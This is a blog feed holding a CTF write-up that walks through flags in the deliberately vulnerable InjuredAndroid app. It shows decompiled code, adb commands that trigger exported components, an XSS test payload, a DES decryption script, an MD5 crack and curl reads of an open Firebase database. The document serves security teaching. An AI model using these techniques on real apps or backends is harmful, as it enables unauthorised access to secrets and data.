{
    "version": "https://jsonfeed.org/version/1",
    "title": "ßUG5Y - Writeups",
    "home_page_url": "http://localhost:4000/",
    "feed_url": "http://localhost:4000/feed.json",
    "description": "ßUG5Y - Writeups",
    "icon": "http://localhost:4000/assets/images/apple-touch-icon.png",
    "favicon": "http://localhost:4000/assets/images/favicon.png",
    "expired": false,
    
    "author":  {
        "name": "ßUG5Y - Writeups",
        "url": null,
        "avatar": null
    },
    
"items": [
    
        {
            "id": "http://localhost:4000/injured-android",
            "title": "Injured android",
            "summary": null,
            "content_text": "This is a write-up of a few of the flags from the intentionally vulnerable Android app Injured Android.I found that this was a great way to get hands-on experience with testing an Android app with fewer unknowns compared to some other CTF apps.Initial SetupGetting started I de-compiled the APK and went ahead and installed the app on our emulator.De-compile the APK: ./jadx /InjuredAndroid/InjuredAndroid-1.0.12-release.apk -d /Decomp-InjuredAndroid --show-bad-codeInstall the app: adb install /InjuredAndroid/InjuredAndroid-1.0.12-release.apkFlag Zero: XSS TestThere is no actual flag for this one just for testing XSS. XSSTextActivity supplies our user input to DisplayPostXSS.package b3nac.injuredandroid;import android.content.Intent;import android.os.Bundle;import android.view.View;import android.widget.EditText;/* loaded from: classes.dex */public class XSSTextActivity extends androidx.appcompat.app.c {    /* JADX INFO: Access modifiers changed from: protected */    @Override // androidx.appcompat.app.c, androidx.fragment.app.d, androidx.activity.ComponentActivity, androidx.core.app.e, android.app.Activity    public void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_xsstext);    }    public void submitText(View view) {        Intent intent = new Intent(this, DisplayPostXSS.class);        intent.putExtra(\"com.b3nac.injuredandroid.DisplayPostXSS\", ((EditText) findViewById(R.id.editText)).getText().toString());        startActivity(intent);    }}DisplayPostXSS then puts our string into a WebView instance that has JavaScript enabled without any prior sanitation.package b3nac.injuredandroid;import android.os.Bundle;import android.webkit.WebChromeClient;import android.webkit.WebSettings;import android.webkit.WebView;/* loaded from: classes.dex */public final class DisplayPostXSS extends androidx.appcompat.app.c {    /* JADX INFO: Access modifiers changed from: protected */    @Override // androidx.appcompat.app.c, androidx.fragment.app.d, androidx.activity.ComponentActivity, androidx.core.app.e, android.app.Activity    public void onCreate(Bundle bundle) {        super.onCreate(bundle);        WebView webView = new WebView(this);        setContentView(webView);        String stringExtra = getIntent().getStringExtra(\"com.b3nac.injuredandroid.DisplayPostXSS\");        WebSettings settings = webView.getSettings();        d.s.d.g.d(settings, \"vulnWebView.settings\");        settings.setJavaScriptEnabled(true);        webView.setWebChromeClient(new WebChromeClient());        webView.loadData(stringExtra, \"text/html\", \"UTF-8\");    }}&lt;h1&gt;XSS &lt;script&gt;alert(1)&lt;/script&gt;!&lt;/h1&gt;Flag One: LoginFor the first real flag, we can view the conveniently named class FlagOneLoginActivity from the de-compiled APK.public final class FlagOneLoginActivity extends androidx.appcompat.app.c {    private int w;    /* loaded from: classes.dex */    static final class a implements View.OnClickListener {        a() {        }        @Override // android.view.View.OnClickListener        public final void onClick(View view) {            if (FlagOneLoginActivity.this.F() == 0) {                Snackbar X = Snackbar.X(view, \"The flag is right under your nose.\", 0);                X.Y(\"Action\", null);                X.N();                FlagOneLoginActivity flagOneLoginActivity = FlagOneLoginActivity.this;                flagOneLoginActivity.G(flagOneLoginActivity.F() + 1);            } else if (FlagOneLoginActivity.this.F() == 1) {                Snackbar X2 = Snackbar.X(view, \"The flag is also under the GUI.\", 0);                X2.Y(\"Action\", null);                X2.N();                FlagOneLoginActivity.this.G(0);            }        }    }    public final int F() {        return this.w;    }    public final void G(int i) {        this.w = i;    }    /* JADX INFO: Access modifiers changed from: protected */    @Override // androidx.appcompat.app.c, androidx.fragment.app.d, androidx.activity.ComponentActivity, androidx.core.app.e, android.app.Activity    public void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_flag_one_login);        j.j.a(this);        C((Toolbar) findViewById(R.id.toolbar));        ((FloatingActionButton) findViewById(R.id.fab)).setOnClickListener(new a());    }    public final void submitFlag(View view) {        EditText editText = (EditText) findViewById(R.id.editText2);        d.s.d.g.d(editText, \"editText2\");        if (d.s.d.g.a(editText.getText().toString(), \"F1ag_0n3\")) {            Intent intent = new Intent(this, FlagOneSuccess.class);            new FlagsOverview().J(true);            new j().b(this, \"flagOneButtonColor\", true);            startActivity(intent);        }    }}Reviewing the code we find submitFlag() which compares our user-supplied string to a hard-coded string F1ag_0n3. If our string matches the hard-coded string then a new intent FlagOneSuccess will be triggered    public final void submitFlag(View view) {        EditText editText = (EditText) findViewById(R.id.editText2);        d.s.d.g.d(editText, \"editText2\");        if (d.s.d.g.a(editText.getText().toString(), \"F1ag_0n3\")) {            Intent intent = new Intent(this, FlagOneSuccess.class);            new FlagsOverview().J(true);            new j().b(this, \"flagOneButtonColor\", true);            startActivity(intent);        }    }Flag Two: Exported ActivitiesLooking into FlagTwoActivity we see the hints that we need to use an exported activity.package b3nac.injuredandroid;import android.os.Bundle;import android.view.View;import androidx.appcompat.widget.Toolbar;import com.google.android.material.floatingactionbutton.FloatingActionButton;import com.google.android.material.snackbar.Snackbar;/* loaded from: classes.dex */public class FlagTwoActivity extends androidx.appcompat.app.c {    int w = 0;    public /* synthetic */ void F(View view) {        int i = this.w;        if (i == 0) {            Snackbar X = Snackbar.X(view, \"Key words Activity and exported.\", 0);            X.Y(\"Action\", null);            X.N();            this.w++;        } else if (i == 1) {            Snackbar X2 = Snackbar.X(view, \"Exported Activities can be accessed with adb or Drozer.\", 0);            X2.Y(\"Action\", null);            X2.N();            this.w = 0;        }    }    /* JADX INFO: Access modifiers changed from: protected */    @Override // androidx.appcompat.app.c, androidx.fragment.app.d, androidx.activity.ComponentActivity, androidx.core.app.e, android.app.Activity    public void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_flag_two);        C((Toolbar) findViewById(R.id.toolbar));        ((FloatingActionButton) findViewById(R.id.fab)).setOnClickListener(new View.OnClickListener() { // from class: b3nac.injuredandroid.d            @Override // android.view.View.OnClickListener            public final void onClick(View view) {                FlagTwoActivity.this.F(view);            }        });    }}Reviewing the manifest we can find a few exported activities, however, the one we want is b25lActivity.&lt;activity android:name=\".b25lActivity\" android:exported=\"true\" /&gt;Once we open b25lActivity we will see that using this activity will trigger the flag for this flag activity.package b3nac.injuredandroid;import android.os.Bundle;/* loaded from: classes.dex */public final class b25lActivity extends androidx.appcompat.app.c {    /* JADX INFO: Access modifiers changed from: protected */    @Override // androidx.appcompat.app.c, androidx.fragment.app.d, androidx.activity.ComponentActivity, androidx.core.app.e, android.app.Activity    public void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_b25l);        j.j.a(this);        new FlagsOverview().M(true);        new j().b(this, \"flagTwoButtonColor\", true);    }}To call the activity: adb shell am start -n b3nac.injuredandroid/b3nac.injuredandroid.b25lActivityFlag Three: ResourcesNow onto FlagThreeActivity we can see that within submitFlag() our user-supplied string is being compared to a string that is being retrieved using getString().package b3nac.injuredandroid;import android.content.Intent;import android.os.Bundle;import android.view.View;import android.widget.EditText;import androidx.appcompat.widget.Toolbar;import com.google.android.material.floatingactionbutton.FloatingActionButton;import com.google.android.material.snackbar.Snackbar;/* loaded from: classes.dex */public final class FlagThreeActivity extends androidx.appcompat.app.c {    private int w;    /* loaded from: classes.dex */    static final class a implements View.OnClickListener {        a() {        }        @Override // android.view.View.OnClickListener        public final void onClick(View view) {            if (FlagThreeActivity.this.F() == 0) {                Snackbar X = Snackbar.X(view, \"R stands for resources.\", 0);                X.Y(\"Action\", null);                X.N();                FlagThreeActivity flagThreeActivity = FlagThreeActivity.this;                flagThreeActivity.G(flagThreeActivity.F() + 1);            } else if (FlagThreeActivity.this.F() == 1) {                Snackbar X2 = Snackbar.X(view, \"Check .xml files.\", 0);                X2.Y(\"Action\", null);                X2.N();                FlagThreeActivity.this.G(0);            }        }    }    public final int F() {        return this.w;    }    public final void G(int i) {        this.w = i;    }    /* JADX INFO: Access modifiers changed from: protected */    @Override // androidx.appcompat.app.c, androidx.fragment.app.d, androidx.activity.ComponentActivity, androidx.core.app.e, android.app.Activity    public void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_flag_three);        j.j.a(this);        C((Toolbar) findViewById(R.id.toolbar));        ((FloatingActionButton) findViewById(R.id.fab)).setOnClickListener(new a());    }    public final void submitFlag(View view) {        EditText editText = (EditText) findViewById(R.id.editText2);        d.s.d.g.d(editText, \"editText2\");        if (d.s.d.g.a(editText.getText().toString(), getString(R.string.cmVzb3VyY2VzX3lv))) {            Intent intent = new Intent(this, FlagOneSuccess.class);            new FlagsOverview().L(true);            new j().b(this, \"flagThreeButtonColor\", true);            startActivity(intent);        }    }}Following the Androids documentation getString() is retrieving the string with the name of cmVzb3VyY2VzX3lv from res/values/*filename*.xml. Opening res/values we can locate strings.xml. A quick search for the string name and we find our flag.&lt;string name=\"cmVzb3VyY2VzX3lv\"&gt;F1ag_thr33&lt;/string&gt;Flag Four: Login 2FlagFourActivitypackage b3nac.injuredandroid;import android.content.Intent;import android.os.Bundle;import android.view.View;import android.widget.EditText;import com.google.android.material.floatingactionbutton.FloatingActionButton;import com.google.android.material.snackbar.Snackbar;/* loaded from: classes.dex */public final class FlagFourActivity extends androidx.appcompat.app.c {    private int w;    /* loaded from: classes.dex */    static final class a implements View.OnClickListener {        a() {        }        @Override // android.view.View.OnClickListener        public final void onClick(View view) {            if (FlagFourActivity.this.F() == 0) {                Snackbar X = Snackbar.X(view, \"Where is bob.\", 0);                X.Y(\"Action\", null);                X.N();                FlagFourActivity flagFourActivity = FlagFourActivity.this;                flagFourActivity.G(flagFourActivity.F() + 1);            } else if (FlagFourActivity.this.F() == 1) {                Snackbar X2 = Snackbar.X(view, \"Classes and imports.\", 0);                X2.Y(\"Action\", null);                X2.N();                FlagFourActivity.this.G(0);            }        }    }    public final int F() {        return this.w;    }    public final void G(int i) {        this.w = i;    }    /* JADX INFO: Access modifiers changed from: protected */    @Override // androidx.appcompat.app.c, androidx.fragment.app.d, androidx.activity.ComponentActivity, androidx.core.app.e, android.app.Activity    public void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_flag_four);        j.j.a(this);        ((FloatingActionButton) findViewById(R.id.fab)).setOnClickListener(new a());    }    public final void submitFlag(View view) {        EditText editText = (EditText) findViewById(R.id.editText2);        d.s.d.g.d(editText, \"editText2\");        String obj = editText.getText().toString();        byte[] a2 = new g().a();        d.s.d.g.d(a2, \"decoder.getData()\");        if (d.s.d.g.a(obj, new String(a2, d.w.c.f2418a))) {            Intent intent = new Intent(this, FlagOneSuccess.class);            new FlagsOverview().I(true);            new j().b(this, \"flagFourButtonColor\", true);            startActivity(intent);        }    }}Once again in submitFlag() we can see that our user-supplied string is being compared to another string. This time it is being compared to String(a2, d.w.c.f2418a). We can also see that a2 is equal to g().a(). Let’s start with d.w.c.f2418a.Opening up d.w.c we can find f2418a but really nothing else useful to us.package d.w;import java.nio.charset.Charset;/* loaded from: classes.dex */public final class c {    /* renamed from: a  reason: collision with root package name */    public static final Charset f2418a;    static {        Charset forName = Charset.forName(\"UTF-8\");        d.s.d.g.d(forName, \"Charset.forName(\\\"UTF-8\\\")\");        f2418a = forName;        d.s.d.g.d(Charset.forName(\"UTF-16\"), \"Charset.forName(\\\"UTF-16\\\")\");        d.s.d.g.d(Charset.forName(\"UTF-16BE\"), \"Charset.forName(\\\"UTF-16BE\\\")\");        d.s.d.g.d(Charset.forName(\"UTF-16LE\"), \"Charset.forName(\\\"UTF-16LE\\\")\");        d.s.d.g.d(Charset.forName(\"US-ASCII\"), \"Charset.forName(\\\"US-ASCII\\\")\");        d.s.d.g.d(Charset.forName(\"ISO-8859-1\"), \"Charset.forName(\\\"ISO-8859-1\\\")\");    }}Since that was a bust let’s look into a2. From g() in the b3nac.injuredandroid folder we find f1468a. Which turns out to simply be base64 decoding NF9vdmVyZG9uZV9vbWVsZXRz.package b3nac.injuredandroid;import android.util.Base64;/* loaded from: classes.dex */public class g {    /* renamed from: a  reason: collision with root package name */    private byte[] f1468a = Base64.decode(\"NF9vdmVyZG9uZV9vbWVsZXRz\", 0);    public byte[] a() {        return this.f1468a;    }}Decoding the string will give us our key to trigger the flag.echo 'NF9vdmVyZG9uZV9vbWVsZXRz' | base64 --decode4_overdone_omeletsFlag Five: Exported Broadcast ReceiverFrom the de-compiled code for FlagFiveActivity we can see that an intent com.b3nac.injuredandroid.intent.action.CUSTOM_INTENT is being created along with a listener. Additionally the receiver is created using ComponentName(this, FlagFiveReceiver.class).package b3nac.injuredandroid;import android.content.ComponentName;import android.content.Intent;import android.content.IntentFilter;import android.os.Bundle;import android.view.View;import android.widget.Button;import androidx.appcompat.widget.Toolbar;import com.google.android.material.floatingactionbutton.FloatingActionButton;import com.google.android.material.snackbar.Snackbar;/* loaded from: classes.dex */public class FlagFiveActivity extends androidx.appcompat.app.c {    int w = 0;    private FlagFiveReceiver x = new FlagFiveReceiver();    public void F() {        sendBroadcast(new Intent(\"com.b3nac.injuredandroid.intent.action.CUSTOM_INTENT\"));    }    public /* synthetic */ void G(View view) {        int i = this.w;        if (i == 0) {            Snackbar X = Snackbar.X(view, \"Where is bob.\", 0);            X.Y(\"Action\", null);            X.N();            this.w++;        } else if (i == 1) {            Snackbar X2 = Snackbar.X(view, \"Classes and imports.\", 0);            X2.Y(\"Action\", null);            X2.N();            this.w = 0;        }    }    public /* synthetic */ void H(View view) {        F();    }    /* JADX INFO: Access modifiers changed from: protected */    @Override // androidx.appcompat.app.c, androidx.fragment.app.d, androidx.activity.ComponentActivity, androidx.core.app.e, android.app.Activity    public void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_flag_five);        C((Toolbar) findViewById(R.id.toolbar));        ((FloatingActionButton) findViewById(R.id.fab)).setOnClickListener(new View.OnClickListener() { // from class: b3nac.injuredandroid.c            @Override // android.view.View.OnClickListener            public final void onClick(View view) {                FlagFiveActivity.this.G(view);            }        });        Button button = (Button) findViewById(R.id.button9);        new ComponentName(this, FlagFiveReceiver.class);        getPackageManager();        a.m.a.a.b(this).c(this.x, new IntentFilter(\"com.b3nac.injuredandroid.intent.action.CUSTOM_INTENT\"));        button.setOnClickListener(new View.OnClickListener() { // from class: b3nac.injuredandroid.b            @Override // android.view.View.OnClickListener            public final void onClick(View view) {                FlagFiveActivity.this.H(view);            }        });    }    /* JADX INFO: Access modifiers changed from: protected */    @Override // androidx.appcompat.app.c, androidx.fragment.app.d, android.app.Activity    public void onDestroy() {        a.m.a.a.b(this).e(this.x);        super.onDestroy();    }}In FlagFiveReceiver we can see that if i2 is not 0 we will go into the else portion. Once there we can see that if i2 is equal to 2 then we will trigger the flag. i2 is equal to f1454a which is equal to i which presumably starts at zero but is increased by 1 each time the Broadcast Receiver receives the intent.package b3nac.injuredandroid;import android.content.BroadcastReceiver;import android.content.Context;import android.content.Intent;import android.util.Log;import android.widget.Toast;/* loaded from: classes.dex */public final class FlagFiveReceiver extends BroadcastReceiver {    /* renamed from: a  reason: collision with root package name */    private static int f1454a;    @Override // android.content.BroadcastReceiver    public void onReceive(Context context, Intent intent) {        String str;        int i;        String e;        String e2;        d.s.d.g.e(context, \"context\");        d.s.d.g.e(intent, \"intent\");        j.j.a(context);        int i2 = f1454a;        if (i2 == 0) {            StringBuilder sb = new StringBuilder();            e = d.w.h.e(\"\\n    Action: \" + intent.getAction() + \"\\n\\n    \");            sb.append(e);            e2 = d.w.h.e(\"\\n    URI: \" + intent.toUri(1) + \"\\n\\n    \");            sb.append(e2);            str = sb.toString();            d.s.d.g.d(str, \"sb.toString()\");            Log.d(\"DUDE!:\", str);        } else {            str = \"Keep trying!\";            if (i2 != 1) {                if (i2 != 2) {                    Toast.makeText(context, \"Keep trying!\", 1).show();                    return;                }                String str2 = \"You are a winner \" + k.a(\"Zkdlt0WwtLQ=\");                new FlagsOverview().H(true);                new j().b(context, \"flagFiveButtonColor\", true);                Toast.makeText(context, str2, 1).show();                i = 0;                f1454a = i;            }        }        Toast.makeText(context, str, 1).show();        i = f1454a + 1;        f1454a = i;    }}Sending a broadcast twice we can trigger the flag.adb shell am broadcast -a com.b3nac.injuredandroid.intent.action.CUSTOM_INTENTFlag Six: Login3FlagSixLoginActivity is another login-style activity. Again in submitFlag() our user supplied data is being compared to another object, this time it is being compared to k.a(\"k3FElEG9lnoWbOateGhj5pX6QsXRNJKh///8Jxi8KXW7iDpk2xRxhQ==\").package b3nac.injuredandroid;import android.content.Intent;import android.os.Bundle;import android.view.View;import android.widget.EditText;import androidx.appcompat.widget.Toolbar;import com.google.android.material.floatingactionbutton.FloatingActionButton;import com.google.android.material.snackbar.Snackbar;/* loaded from: classes.dex */public final class FlagSixLoginActivity extends androidx.appcompat.app.c {    private int w;    /* loaded from: classes.dex */    static final class a implements View.OnClickListener {        a() {        }        @Override // android.view.View.OnClickListener        public final void onClick(View view) {            if (FlagSixLoginActivity.this.F() == 0) {                d.s.d.g.c(view);                Snackbar X = Snackbar.X(view, \"Keys.\", 0);                X.Y(\"Action\", null);                X.N();                FlagSixLoginActivity flagSixLoginActivity = FlagSixLoginActivity.this;                flagSixLoginActivity.G(flagSixLoginActivity.F() + 1);            } else if (FlagSixLoginActivity.this.F() == 1) {                d.s.d.g.c(view);                Snackbar X2 = Snackbar.X(view, \"Classes.\", 0);                X2.Y(\"Action\", null);                X2.N();                FlagSixLoginActivity.this.G(0);            }        }    }    public final int F() {        return this.w;    }    public final void G(int i) {        this.w = i;    }    /* JADX INFO: Access modifiers changed from: protected */    @Override // androidx.appcompat.app.c, androidx.fragment.app.d, androidx.activity.ComponentActivity, androidx.core.app.e, android.app.Activity    public void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_flag_six_login);        j.j.a(this);        C((Toolbar) findViewById(R.id.toolbar));        ((FloatingActionButton) findViewById(R.id.fab)).setOnClickListener(new a());    }    public final void submitFlag(View view) {        EditText editText = (EditText) findViewById(R.id.editText3);        d.s.d.g.d(editText, \"editText3\");        if (d.s.d.g.a(editText.getText().toString(), k.a(\"k3FElEG9lnoWbOateGhj5pX6QsXRNJKh///8Jxi8KXW7iDpk2xRxhQ==\"))) {            Intent intent = new Intent(this, FlagOneSuccess.class);            FlagsOverview.G = true;            new j().b(this, \"flagSixButtonColor\", true);            startActivity(intent);        }    }}Viewing k() in the in the b3nac.injuredandroid folder.package b3nac.injuredandroid;import android.text.TextUtils;import android.util.Base64;import java.security.InvalidKeyException;import java.security.NoSuchAlgorithmException;import java.security.spec.InvalidKeySpecException;import javax.crypto.BadPaddingException;import javax.crypto.Cipher;import javax.crypto.IllegalBlockSizeException;import javax.crypto.NoSuchPaddingException;import javax.crypto.SecretKey;import javax.crypto.SecretKeyFactory;import javax.crypto.spec.DESKeySpec;/* loaded from: classes.dex */public class k {    /* renamed from: a  reason: collision with root package name */    private static final byte[] f1472a = h.b();    /* renamed from: b  reason: collision with root package name */    private static final byte[] f1473b = h.a();    public static String a(String str) {        if (c(str)) {            try {                SecretKey generateSecret = SecretKeyFactory.getInstance(\"DES\").generateSecret(new DESKeySpec(f1472a));                byte[] decode = Base64.decode(str, 0);                Cipher cipher = Cipher.getInstance(\"DES\");                cipher.init(2, generateSecret);                return new String(cipher.doFinal(decode));            } catch (InvalidKeyException | NoSuchAlgorithmException | InvalidKeySpecException | BadPaddingException | IllegalBlockSizeException | NoSuchPaddingException e) {                e.printStackTrace();            }        } else {            System.out.println(\"Not a string!\");        }        return str;    }    public static String b(String str) {        if (c(str)) {            try {                SecretKey generateSecret = SecretKeyFactory.getInstance(\"DES\").generateSecret(new DESKeySpec(f1473b));                byte[] decode = Base64.decode(str, 0);                Cipher cipher = Cipher.getInstance(\"DES\");                cipher.init(2, generateSecret);                return new String(cipher.doFinal(decode));            } catch (InvalidKeyException | NoSuchAlgorithmException | InvalidKeySpecException | BadPaddingException | IllegalBlockSizeException | NoSuchPaddingException e) {                e.printStackTrace();            }        } else {            System.out.println(\"Not a string!\");        }        return str;    }    public static boolean c(String str) {        if (TextUtils.isEmpty(str)) {            return false;        }        try {            Base64.decode(str, 0);            return true;        } catch (Exception unused) {            return false;        }    }}\"k3FElEG9lnoWbOateGhj5pX6QsXRNJKh///8Jxi8KXW7iDpk2xRxhQ==\" is being passed into a() as str. str is base64 decoded then passed to String(cipher.doFinal(decode)) as decode where it is decrypted using a DES cipher generated using DESKeySpec(f1472a) from SecretKeyFactory.From Oracle’s DESKeySpec documentation:  “DESKeySpec(byte[] key) Creates a DESKeySpec object using the first 8 bytes in key as the key material for the DES key.”With that being said f1472a is going to be the key object for DESKeySpec().We see that the key f1472a is equal to h.b() so lets track that down.package b3nac.injuredandroid;import android.util.Base64;/* loaded from: classes.dex */public class h {    /* renamed from: a  reason: collision with root package name */    private static byte[] f1469a = Base64.decode(\"Q2FwdHVyM1RoMXM=\", 0);    /* renamed from: b  reason: collision with root package name */    private static byte[] f1470b = Base64.decode(\"e0NhcHR1cjNUaDFzVG9vfQ==\", 0);    /* renamed from: c  reason: collision with root package name */    private static String f1471c = \"9EEADi^^:?;FC652?5C@:5]7:C632D6:@]4@&gt;^DB=:E6];D@?\";    /* JADX INFO: Access modifiers changed from: package-private */    public static byte[] a() {        return f1470b;    }    /* JADX INFO: Access modifiers changed from: package-private */    public static byte[] b() {        return f1469a;    }    /* JADX INFO: Access modifiers changed from: package-private */    public static String c() {        return f1471c;    }}b() is returning f1469a which is simply base64 decoding \"Q2FwdHVyM1RoMXM=\".echo \"Q2FwdHVyM1RoMXM=\" | base64 --decodeCaptur3Th1sNow that we have the DESKeySpec() key we can reverse the encryption process.import base64from Crypto.Cipher import DESkey = \"Captur3Th1s\"encodedString = \"k3FElEG9lnoWbOateGhj5pX6QsXRNJKh///8Jxi8KXW7iDpk2xRxhQ==\"keyByte = key[:8].encode('utf-8')stringByte = base64.b64decode(encodedString)desReverse = DES.new(keyByte, DES.MODE_ECB)print(desReverse.decrypt(stringByte))We will then receive b\"{This_Isn't_Where_I_Parked_My_Car}\\x06\\x06\\x06\\x06\\x06\\x06\".Ignoring the trailing bytes we have our answer.Flag Seven: SQLiteFlagSevenSqliteActivityOnce we open the activity a SQLite database named Thisisatest is created. contentValues.put(”title”, ) &amp; contentValues.put(”subtitle”, ) are being used to provide the data to be inserted into the database.@Override // androidx.appcompat.app.c, androidx.fragment.app.d, androidx.activity.ComponentActivity, androidx.core.app.e, android.app.Activity    public void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_flag_seven_sqlite);        C((Toolbar) findViewById(R.id.toolbar));        j.j.a(this);        H();        ((FloatingActionButton) findViewById(R.id.fab)).setOnClickListener(new a());        SQLiteDatabase writableDatabase = this.x.getWritableDatabase();        ContentValues contentValues = new ContentValues();        contentValues.put(\"title\", Base64.decode(\"VGhlIGZsYWcgaGFzaCE=\", 0));        contentValues.put(\"subtitle\", Base64.decode(\"MmFiOTYzOTBjN2RiZTM0MzlkZTc0ZDBjOWIwYjE3Njc=\", 0));        writableDatabase.insert(\"Thisisatest\", null, contentValues);        contentValues.put(\"title\", Base64.decode(\"VGhlIGZsYWcgaXMgYWxzbyBhIHBhc3N3b3JkIQ==\", 0));        contentValues.put(\"subtitle\", h.c());        writableDatabase.insert(\"Thisisatest\", null, contentValues);    }For the first row in the database both the “title” and “subtitle” are base64 decoded version of their associated hard-coded string.contentValues.put(\"title\", Base64.decode(\"VGhlIGZsYWcgaGFzaCE=\", 0));contentValues.put(\"subtitle\", Base64.decode(\"MmFiOTYzOTBjN2RiZTM0MzlkZTc0ZDBjOWIwYjE3Njc=\", 0));writableDatabase.insert(\"Thisisatest\", null, contentValues);Base64 decoding both we receive the following:title: echo \"VGhlIGZsYWcgaGFzaCE=\" | base64 --decodeThe flag hash!subtitle: echo \"MmFiOTYzOTBjN2RiZTM0MzlkZTc0ZDBjOWIwYjE3Njc=\" | base64 --decode2ab96390c7dbe3439de74d0c9b0b1767However for the second row the “title” is a base64 decoded version of its associated string but the “subtitle” is h.c().contentValues.put(\"title\", Base64.decode(\"VGhlIGZsYWcgaXMgYWxzbyBhIHBhc3N3b3JkIQ==\", 0));contentValues.put(\"subtitle\", h.c());writableDatabase.insert(\"Thisisatest\", null, contentValues);Base64 decoding the “title” we receive the following:title: echo \"VGhlIGZsYWcgaXMgYWxzbyBhIHBhc3N3b3JkIQ==\" | base64 --decodeThe flag is also a password!Wanting to know what is being supplied from h.c() I decided to use use sqlite3 to interact with the database.emu64xa:/data/data/b3nac.injuredandroid/databases # sqlite3 Thisisatest.dbSQLite version 3.32.2 2021-07-12 15:00:17Enter \".help\" for usage hints.sqlite&gt; .tablesThisisatest       android_metadatasqlite&gt; SELECT * FROM Thisisatest;1|The flag hash!|2ab96390c7dbe3439de74d0c9b0b17672|The flag is also a password!|9EEADi^^:?;FC652?5C@:5]7:C632D6:@]4@&gt;^DB=:E6];D@?So the string 2ab96390c7dbe3439de74d0c9b0b1767 from row 1 is a hash. Lets see if we can crack it. Using hashid we can quickly verify that it is likely to be a MD5 hash.hashid 2ab96390c7dbe3439de74d0c9b0b1767Analyzing '2ab96390c7dbe3439de74d0c9b0b1767'[+] MD2 [+] MD5 [+] MD4Thanks to CrackStation we didn’t even need to open hashcat.Hash\t                           Type\tResult2ab96390c7dbe3439de74d0c9b0b1767\tmd5\thunter2Now onto row 2 we could look into h.c() but lets see if we can get an easy win first. Using ciphey we uncover the plaintext version of the string.docker run -it --rm remnux/ciphey \"9EEADi^^:?;FC652?5C@:5]7:C632D6:@]4@&gt;^DB=:E6];D@?\"Possible plaintext: 'https://injuredandroid.firebaseio.com/sqlite.json' (y/N): y╭───────────────────────────────────────────────────────────────────────────╮│ The plaintext is a Uniform Resource Locator (URL)                         ││ Formats used:                                                             ││    rot47:                                                                 ││     Key: 47Plaintext: \"https://injuredandroid.firebaseio.com/sqlite.json\" │╰───────────────────────────────────────────────────────────────────────────╯Lastly, running opening the URL we can get the last part of the puzzle. curl https://injuredandroid.firebaseio.com/sqlite.json\"S3V3N_11\"Flag Eight: AWSFlagEightLoginActivityOn top of searching for AWS and the string names I ran trufflehog but did not find any strings that match any AWS patterns or anything similar. For sanity sake I looked at another write-up of this app which in their case they found the AWS credentials within strings.xml.Looking into strings.xml we find two spaces for AWS credentials to be in but no info is shown for these lines. For whatever reason those credentials are no longer in this app.&lt;string name=\"AWS_ID\" /&gt;&lt;string name=\"AWS_SECRET\" /&gt;Flag Nine: FirebaseFlagNineFirebaseActivityThis activity gives a rather helpful hint, “Use the .json trick with database url”. A quick Google search we can find an article provided in hacktricks. https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security/gcp-services/gcp-databases-enum/gcp-firebase-enumFirst up we will need to find the Firebase URL e can go ahead and grep for Firebase or alternatively if we provide the APK to MobSF the Firebase URL will automatically be located for us. Either way the Firebase URL is located in the strings.xml file.&lt;string name=\"firebase_database_url\"&gt;https://injuredandroid.firebaseio.com&lt;/string&gt;Now that we have the URL lets see what we need to trigger the flag. b() shows us that if this.f1456b, which is our user supplied string, is equal to the string from aVar.c() then the flag will be triggered. Since aVar is from the Firebase database lets look into the database itself.public void b(com.google.firebase.database.a aVar) {            d.s.d.g.e(aVar, \"dataSnapshot\");            if (!d.s.d.g.a(this.f1456b, (String) aVar.c())) {                Toast.makeText(FlagNineFirebaseActivity.this, \"Try again! :D\", 0).show();                return;            }            FlagsOverview.J = true;            j jVar = new j();            Context applicationContext = FlagNineFirebaseActivity.this.getApplicationContext();            d.s.d.g.d(applicationContext, \"applicationContext\");            jVar.b(applicationContext, \"flagNineButtonColor\", true);            FlagNineFirebaseActivity.this.G();        }Looking into FlagNineFirebaseActivity the string \"ZmxhZ3Mv\" is being decoded and used as the reference directory.public FlagNineFirebaseActivity() {        byte[] decode = Base64.decode(\"ZmxhZ3Mv\", 0);        this.y = decode;        d.s.d.g.d(decode, \"decodedDirectory\");        Charset charset = StandardCharsets.UTF_8;        d.s.d.g.d(charset, \"StandardCharsets.UTF_8\");        this.z = new String(decode, charset);        com.google.firebase.database.f b2 = com.google.firebase.database.f.b();        d.s.d.g.d(b2, \"FirebaseDatabase.getInstance()\");        com.google.firebase.database.d d2 = b2.d();        d.s.d.g.d(d2, \"FirebaseDatabase.getInstance().reference\");        this.A = d2;        com.google.firebase.database.d h = d2.h(this.z);        d.s.d.g.d(h, \"database.child(refDirectory)\");        this.B = h;    }Base64 decode the string and append to the Firebase URL.echo \"ZmxhZ3Mv\" | base64 --decodeflags/curl https://injuredandroid.firebaseio.com/flags/.json\"[nine!_flag]\"Looking into submitFlag() we can see that our string is being base64 decoded so we will need to bse64 encode our string and then supply the answer.",
            "content_html": "<p>This is a write-up of a few of the flags from the intentionally vulnerable Android app <a href=\"https://github.com/B3nac/InjuredAndroid\">Injured Android</a>.</p><p>I found that this was a great way to get hands-on experience with testing an Android app with fewer unknowns compared to some other CTF apps.</p><h1 id=\"initial-setup\">Initial Setup</h1><p>Getting started I de-compiled the APK and went ahead and installed the app on our emulator.</p><p>De-compile the APK: <code class=\"language-plaintext highlighter-rouge\">./jadx /InjuredAndroid/InjuredAndroid-1.0.12-release.apk -d /Decomp-InjuredAndroid --show-bad-code</code></p><p>Install the app: <code class=\"language-plaintext highlighter-rouge\">adb install /InjuredAndroid/InjuredAndroid-1.0.12-release.apk</code></p><h1 id=\"flag-zero-xss-test\">Flag Zero: XSS Test</h1><p>There is no actual flag for this one just for testing XSS. <code class=\"language-plaintext highlighter-rouge\">XSSTextActivity</code> supplies our user input to <code class=\"language-plaintext highlighter-rouge\">DisplayPostXSS</code>.</p><div class=\"language-jsx highlighter-rouge\"><div class=\"highlight\"><pre 